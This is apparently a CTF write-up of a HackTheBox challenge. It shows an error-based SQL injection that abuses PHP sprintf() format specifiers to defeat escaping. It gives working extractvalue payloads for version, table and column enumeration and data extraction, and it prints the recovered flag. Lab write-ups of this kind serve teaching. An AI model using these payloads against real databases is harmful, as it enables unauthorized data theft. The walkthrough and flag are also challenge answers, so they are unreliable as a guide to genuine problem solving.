---
title: Baby Sql
published: 2026-02-13
description: "Error-based SQL injection via sprintf() format-specifier abuse."
tags: [ctf, htb, sql]
category: CTF
draft: false
---

## Challenge Details

- Name: Baby SQL
- Difficulty: Medium
- Focus: SQL Injection (Error-based)


## Vulnerability

The target is vulnerable to SQL injection due to unsafe handling of user input passed through PHP `sprintf()`.

A crafted format input such as `%1$'` can bypass sanitization from `addslashes()` / `real_escape_string()` by abusing how invalid type specifiers are parsed.

This allows closing the quoted context and injecting SQL.

## Exploitation Path

1. **Confirm DB version** with an error-based payload:

```sql
%1$')||extractvalue(null,concat(0x7e, version()));#
```

2. **Enumerate table names** from `information_schema.tables` with `limit`:

```sql
%1$')||extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)));#
```

3. **Enumerate column names** from `information_schema.columns`:

```sql
%1$')||extractvalue(null,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='totally_not_a_flag' limit 0,1)));#
```

4. **Extract data** from target table:

```sql
%1$')||extractvalue(null,concat(0x7e,(select * from totally_not_a_flag)));#
```

## Result

- DB identified as MariaDB
- Table discovered: `totally_not_a_flag`
- Flag recovered through error output:

```text
HTB{h0w_d1d_y0u_f1nd_m3?}
```

## Takeaways

- Never treat format-string APIs as sanitization-safe.
- Error-based SQLi remains practical when output channels are constrained.
- `information_schema` + `limit n,1` is reliable when aggregate helpers are blocked.

---

Writeup source: https://www.notion.so/Baby-Sql-263bbbc8b725809da60bc1a1d5bde782?source=copy_link
